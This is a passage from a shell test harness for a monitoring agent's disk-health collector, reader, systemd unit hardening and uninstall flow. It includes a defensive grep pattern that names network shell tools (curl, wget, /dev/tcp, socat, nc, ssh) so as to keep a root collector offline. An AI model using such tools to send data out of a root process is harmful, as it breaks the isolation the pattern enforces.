printf '%s\n' "pkg dnf install -y cloudviewer-agent" "ctl enroll --token good-token" | diff -u - "$TMP/bootstrap.log" ||
    fail "without --with-disk-health the bootstrap must not touch disk health"
ok "bootstrap --with-disk-health → smartmontools installed, disk health enabled after enroll; off by default"

# ---- 8c. disk health: collector and reader ----------------------------------
# Neither script takes any override (the collector runs as root), so the
# harness runs copies with their path constants rewritten — exactly those
# lines and nothing else (tests/vector.sh runs the unmodified scripts as
# root in a container).

COLLECT="$REPO_DIR/agent/libexec/disk-health-collect"
READER="$REPO_DIR/agent/libexec/disk-health-read"
mkdir -p "$TMP/run"
rewrite_collector() { # rewrite_collector <PATH value>
    sed -e "s#^PATH=/usr/sbin:/usr/bin:/sbin:/bin\$#PATH=$1#" -e "s#^dir=/run/cloudviewer-agent\$#dir=$TMP/run#" \
        "$COLLECT" >"$TMP/collect.sh"
    [ "$(diff "$COLLECT" "$TMP/collect.sh" | grep -c '^>')" = 2 ] || fail "collector constants moved; update the harness rewrite"
}

rewrite_collector "$TMP/smartbin:/usr/bin:/bin"
: >"$TMP/smartctl.log"
sh "$TMP/collect.sh" || fail "collector failed"
printf '%s\n' "--scan -j" "--json=c -i -H -A -n standby /dev/nvme0" "--json=c -i -H -A -n standby /dev/sdb" |
    diff -u - "$TMP/smartctl.log" || fail "collector must run only the fixed smartctl argv, whole disks only, each once"
f="$TMP/run/disk-health.ndjson"
[ "$(file_mode "$f")" = "644" ] || fail "disk-health.ndjson must be 0644"
[ "$(find "$TMP/run" -type f | wc -l | tr -d ' ')" = 1 ] || fail "collector left temp files behind"
[ "$(wc -l <"$f" | tr -d ' ')" = 3 ] || fail "want one line per device plus the status line"
[ "$(sed -n 1p "$f")" = '{"smartctl":{"exit_status":8},"device":{"name":"/dev/nvme0"}}' ] ||
    fail "smartctl output must be written unchanged (one line each, even without a trailing newline)"
sed -n 3p "$f" | grep -Eq '^\{"cloudviewer_disk_health":\{"time":[0-9]+,"status":"ok","scan_exit_status":0,"devices":2\}\}$' ||
    fail "bad status line: $(sed -n 3p "$f")"

if PATH=/usr/bin:/bin command -v smartctl >/dev/null 2>&1; then
    echo "skip: smartctl installed in /usr/bin or /bin — cannot simulate its absence here"
else
    rewrite_collector "/usr/bin:/bin"
    sh "$TMP/collect.sh" || fail "collector without smartctl failed"
    [ "$(wc -l <"$f" | tr -d ' ')" = 1 ] || fail "without smartctl only the status line may be written"
    grep -Eq '^\{"cloudviewer_disk_health":\{"time":[0-9]+,"status":"smartctl missing"\}\}$' "$f" ||
        fail "bad smartctl-missing line: $(cat "$f")"
fi
ok "collector → fixed argv, device filter, raw lines + status line, atomic 0644; 'smartctl missing' alone"

sed -e "s#/run/cloudviewer-agent/disk-health.ndjson#$TMP/run/disk-health.ndjson#g" -e "s#/proc/mdstat#$TMP/mdstat#g" \
    "$READER" >"$TMP/read.sh"
cp "$REPO_DIR/tests/fixtures/disk-health/degraded-mdstat.txt" "$TMP/mdstat"
sh "$TMP/read.sh" >"$TMP/read.out" || fail "reader failed"
{ sed 's/^/smart	/' "$f"; sed 's/^/mdstat	/' "$TMP/mdstat"; } | diff -u - "$TMP/read.out" ||
    fail "reader must print the collector file then mdstat, every line prefixed with its kind"
rm -f "$f" "$TMP/mdstat"
sh "$TMP/read.sh" >"$TMP/read.out" || fail "reader must exit 0 with nothing to read"
[ ! -s "$TMP/read.out" ] || fail "reader printed something with no inputs"
ok "reader → smart<TAB>/mdstat<TAB> prefixed lines; silent exit 0 when nothing to read"

# ---- 8d. disk health: the trust boundary, statically (specs/44 §3, §9) -----

# The config poller and the renderer never manage units: the only
# systemctl verb they could ever use is the agent reload.
for f in "$POLLER" "$RENDERER"; do
    bad="$(grep -n 'systemctl' "$f" | grep -v 'systemctl reload cloudviewer-agent.service' || true)"
    [ -z "$bad" ] || fail "$(basename "$f") uses systemctl beyond the agent reload: $bad"
    bad="$(grep -nE 'systemd-run|systemd-tmpfiles|/systemd/system|disk-health-collect|cloudviewer-disk-health' "$f" || true)"
    [ -z "$bad" ] || fail "$(basename "$f") reaches for units or the root collector: $bad"
done
# Nothing but the ctl (and the bootstrap, through the ctl) enables the units.
bad="$(grep -nE 'systemctl.*(enable|start).*disk-health' "$POLLER" "$RENDERER" "$REPO_DIR"/packaging/scripts/*.sh \
    "$REPO_DIR/docker/entrypoint.sh" || true)"
[ -z "$bad" ] || fail "disk health may only be enabled by the operator's ctl: $bad"

# The collector: no input from the config channel or the vector user, no
# network, no arguments, no overrides, and smartctl only in its two fixed,
# read-only forms (no -t self-test, no -s/-S/-o setters).
bad="$(grep -nEi 'agent\.env|manifest|vector\.yaml|network|curl|wget|https?:|/dev/(tcp|udp)|socat|ssh|CV_AGENT|(^|[^a-z])nc[[:space:]]|\$[1-9@*#]' "$COLLECT" || true)"
[ -z "$bad" ] || fail "the collector must not reference the config channel, the network or arguments: $bad"
[ "$(grep -c 'smartctl -' "$COLLECT")" = 2 ] || fail "the collector must invoke smartctl exactly twice"
# shellcheck disable=SC2016 # literal shell text, matched verbatim
grep -qF 'scan="$(smartctl --scan -j)"' "$COLLECT" || fail "the scan must be exactly: smartctl --scan -j"
# shellcheck disable=SC2016 # literal shell text, matched verbatim
grep -qF '"$(smartctl --json=c -i -H -A -n standby "$dev")"' "$COLLECT" ||
    fail "the query must be exactly: smartctl --json=c -i -H -A -n standby <dev>"
grep -qF "grep -E '^/dev/(nvme[0-9]+|sd[a-z]+)\$'" "$COLLECT" || fail "the device filter must be the specs/44 pattern"

# The unit: exactly the specs/44 §3.1 [Service] directives, and no [Install]
# (only the timer is installable, and nothing but the ctl installs it).
cat >"$TMP/service.want" <<'EOF'
[Service]
Type=oneshot
ExecStart=/usr/libexec/cloudviewer-agent/disk-health-collect
CapabilityBoundingSet=CAP_SYS_ADMIN CAP_SYS_RAWIO
AmbientCapabilities=
NoNewPrivileges=yes
PrivateNetwork=yes
RestrictAddressFamilies=AF_UNIX
IPAddressDeny=any
ProtectSystem=strict
ReadWritePaths=/run/cloudviewer-agent
ProtectHome=yes
PrivateTmp=yes
ProtectKernelTunables=yes
ProtectKernelModules=yes
ProtectControlGroups=yes
ProtectClock=yes
ProtectHostname=yes
LockPersonality=yes
MemoryDenyWriteExecute=yes
RestrictNamespaces=yes
RestrictRealtime=yes
RestrictSUIDSGID=yes
SystemCallArchitectures=native
DevicePolicy=closed
DeviceAllow=block-blkext r
DeviceAllow=block-sd r
DeviceAllow=char-nvme r
TimeoutStartSec=60
MemoryMax=64M
Nice=10
EOF
UNIT_DIR="$REPO_DIR/agent/systemd"
sed -n '/^\[Service\]/,$p' "$UNIT_DIR/cloudviewer-disk-health.service" | grep -v -e '^#' -e '^$' |
    diff -u "$TMP/service.want" - || fail "cloudviewer-disk-health.service drifted from specs/44 §3.1"
grep -q '^\[Install\]' "$UNIT_DIR/cloudviewer-disk-health.service" && fail "the collector service must not be installable"
grep -qx 'OnUnitActiveSec=5min' "$UNIT_DIR/cloudviewer-disk-health.timer" || fail "the timer must run every 5 minutes"
{ grep -qx 'recommends:' "$REPO_DIR/packaging/nfpm.yaml" && grep -qx '  - smartmontools' "$REPO_DIR/packaging/nfpm.yaml"; } ||
    fail "the package must Recommend smartmontools"
ok "trust boundary → poller/renderer manage no units, collector fixed and offline, unit = specs/44 §3.1"

# ---- 9. uninstall: deregisters, removes runtime state, hints at purge -------

uninstall_out="$(run_ctl uninstall)"
[ ! -e "$ETC" ] || fail "uninstall left the config dir"
[ ! -e "$DATA" ] || fail "uninstall left the data dir"
grep -q "^disable --now cloudviewer-agent.service cloudviewer-agent-config.timer$" "$TMP/systemctl.log" ||
    fail "units not disabled on uninstall"
grep -q "^disable --now cloudviewer-disk-health.timer$" "$TMP/systemctl.log" ||
    fail "uninstall must also switch off disk health"
grep -q "^good-token$" "$TMP/deregister.log" 2>/dev/null ||
    fail "uninstall did not deregister with the agent token"
echo "$uninstall_out" | grep -q "deregistered" || fail "uninstall output must confirm deregistration"
echo "$uninstall_out" | grep -q "apt purge cloudviewer-agent" || fail "uninstall must hint at package removal"
ok "uninstall → units disabled, state removed, server deregistered, purge hint"

# ---- 10. uninstall survives an unreachable facade ---------------------------

run_ctl enroll --token good-token --facade-url "$FACADE" --quiet
sed "s#^CV_AGENT_FACADE_URL=.*#CV_AGENT_FACADE_URL=http://127.0.0.1:1#" \
    "$ETC/agent.env" >"$TMP/agent.env.tmp"
cat "$TMP/agent.env.tmp" >"$ETC/agent.env"
uninstall_out="$(run_ctl uninstall)"
[ ! -e "$ETC" ] || fail "uninstall with dead facade left the config dir"
echo "$uninstall_out" | grep -q "could not be confirmed" ||
    fail "uninstall must say when deregistration could not be confirmed"
ok "uninstall with unreachable facade → still removes everything, honest message"

echo
echo "all $PASS agent tests passed"
